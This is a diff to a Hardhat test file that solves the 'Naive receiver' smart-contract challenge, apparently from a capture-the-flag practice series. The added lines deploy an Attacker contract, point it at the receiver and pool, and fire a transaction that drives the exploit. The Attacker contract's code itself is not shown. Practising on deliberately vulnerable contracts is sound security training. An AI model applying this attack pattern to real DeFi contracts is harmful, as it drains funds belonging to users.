@@ -55,6 +55,15 @@ describe("[Challenge] Naive receiver", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    let Attacker = await ethers.getContractFactory("Attacker");
+    let attacker = await Attacker.deploy();
+    await attacker.addReceiver(receiver.address);
+    await attacker.addPool(pool.address);
+    await player.sendTransaction({
+      to: attacker.address,
+      data: "0x",
+      gasLimit: 30000000,
+    });
   });
 
   after(async function () {
